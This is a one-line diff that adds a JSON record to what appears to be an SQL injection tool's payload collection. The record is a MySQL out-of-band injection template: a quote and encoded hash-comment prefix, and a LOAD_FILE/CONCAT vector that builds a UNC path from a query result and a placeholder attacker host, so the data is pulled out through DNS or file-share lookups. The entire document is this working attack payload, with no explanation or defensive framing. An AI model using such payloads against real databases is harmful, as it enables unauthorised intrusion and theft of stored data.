@@ -1,0 +1,1 @@
+{"dbms": "mysql", "technique": "oob", "boundary": {"prefix": "'%23", "suffix": "", "type": "single-enc-hash"}, "vector": "{B} AND (SELECT LOAD_FILE(CONCAT('\\\\\\\\',({Q}),'.{OOB}\\\\a')))", "comment": "mysql oob: single+enc hash"}
